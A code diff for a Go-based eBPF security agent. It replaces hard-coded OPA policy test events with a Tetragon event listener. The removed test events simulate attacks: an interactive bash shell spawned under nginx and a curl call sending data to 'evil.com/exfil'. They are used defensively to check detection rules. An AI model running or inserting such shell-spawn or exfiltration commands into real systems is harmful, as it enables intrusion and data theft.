@@ -1,79 +1,44 @@
 package main
 
 import (
-    "fmt"
-    "log"
+	"context"
+	"log"
+	"os"
+	"os/signal"
+	"syscall"
 
-    "github.com/karandesai2005/ebpf-agent/internal/opa"
+	"github.com/karandesai2005/ebpf-agent/internal/opa"
+	"github.com/karandesai2005/ebpf-agent/internal/tetragon"
 )
 
 func main() {
-    // Load OPA engine
-    engine, err := opa.NewEngine("./policies")
-    if err != nil {
-        log.Fatalf("failed to load OPA: %v", err)
-    }
-    fmt.Println("OPA engine loaded")
+	log.Println("🚀 krato — eBPF security agent starting...")
 
-    // Simulate a malicious event — shell spawned inside nginx container
-    testEvent := map[string]interface{}{
-        "type": "process_exec",
-        "process": map[string]interface{}{
-            "binary":      "/bin/bash",
-            //"binary": "/usr/sbin/nginx", not mallacious 
-            "arguments":   "-i",
-            "parent_name": "nginx",//Loads all .rego files from your policies folder, 
-            //"parent_name": "systemd",
-            "pid":         float64(1234),
-            "uid":         float64(0),
-        },
-        "container": map[string]interface{}{
-            "namespace": "production",
-            "pod_name":  "nginx-pod-abc123",
-            "name":      "nginx",
-        },
-    }
-    testEvent2 := map[string]interface{}{
-    "type": "process_exec",
-    "process": map[string]interface{}{
-        "binary":      "/usr/bin/curl",
-        "arguments":   "http://evil.com/exfil",
-        "parent_name": "node",
-        "pid":         float64(9012),
-        "uid":         float64(1000),
-    },
-    "container": map[string]interface{}{
-        "namespace": "production",
-        "pod_name":  "api-pod-xyz",
-        "name":      "api-server",
-    },
-}
+	// Load OPA engine with Rego policies
+	engine, err := opa.NewEngine("./policies")
+	if err != nil {
+		log.Fatalf("failed to load OPA policies: %v", err)
+	}
+	log.Println("✅ OPA policies loaded")
 
-    results2, err := engine.Evaluate("agent.process.deny", testEvent2)
-    if err != nil {
-        log.Fatalf("OPA evaluation failed: %v", err)
-    }
+	// Create Tetragon listener
+	listener := tetragon.NewListener("localhost:54321", engine)
 
-    if len(results2) > 0 {
-        fmt.Println("\n🚨 ALERT FIRED:")
-        for _, msg := range results2 {
-            fmt.Printf("  → %s\n", msg)
-        }
-    } else {
-        fmt.Println("✅ Clean")
-    }
+	// Context for graceful shutdown
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
 
-    results, err := engine.Evaluate("agent.process.deny", testEvent)
-    if err != nil {
-        log.Fatalf("OPA evaluation failed: %v", err)
-    }
+	// Ctrl+C handler
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigCh
+		log.Println("\n🛑 shutting down...")
+		cancel()
+	}()
 
-    if len(results) > 0 {
-        fmt.Println("\n🚨 ALERT FIRED:")
-        for _, msg := range results {
-            fmt.Printf("  → %s\n", msg)
-        }
-    } else {
-        fmt.Println("✅ Clean — no rules triggered")
-    }
+	// Start listening — blocks forever until Ctrl+C
+	if err := listener.Start(ctx); err != nil {
+		log.Printf("listener stopped: %v", err)
+	}
 }
